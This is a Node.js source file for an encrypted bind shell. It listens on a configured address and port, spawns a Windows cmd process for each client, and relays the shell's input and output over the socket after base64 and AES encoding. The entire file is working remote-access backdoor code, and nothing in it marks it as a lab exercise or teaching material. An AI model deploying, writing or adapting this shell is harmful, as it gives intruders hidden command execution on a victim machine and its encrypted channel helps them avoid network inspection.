const { createServer } = require("net")
const { spawn } = require("child_process")
const { CryptorAES, b64coder } = require('./crypt')
const {listen_address, listen_port, aes_password, aes_iv} = require('./server_config.json')

const b64 = new b64coder()
const crypt = new CryptorAES(aes_password, aes_iv)

function translate_out(cleartext){
    const encodedData = b64.encode_b64(cleartext.toString())
    const encrypted = crypt.encrypt(encodedData)
    return(encrypted)
}

function translate_in(ciphertext){
    const decrypted = crypt.decrypt(ciphertext.toString())
    const decodedData = b64.decode_b64(decrypted)
    return(decodedData)
}

const server = createServer((socket) => {
    

    const shell = spawn("cmd")
    console.log("INFO:client connected")

    // shell stdout to client
    shell.stdout.on("data", (data) => {
        socket.write(translate_out(data))
    })
    
    shell.stderr.on("data", (error) => {
        socket.write(translate_out(error))
    })

    shell.on("exit", () => {
        console.log("INFO:client closed the shell")
        process.exit(0)
    })

    socket.on("data", (data) => {
        shell.stdin.write(`${translate_in(data)}\n`)
    })

    socket.on("error", (err) => {
        console.log(`ERROR:${err}`)
    })
    
    socket.on("end", () => {
        console.log("INFO:client disconnected")
    })
})

const config = {
    host: listen_address,
    port: listen_port,
    exclusive: true
}

server.listen(config, () => { 
    console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
});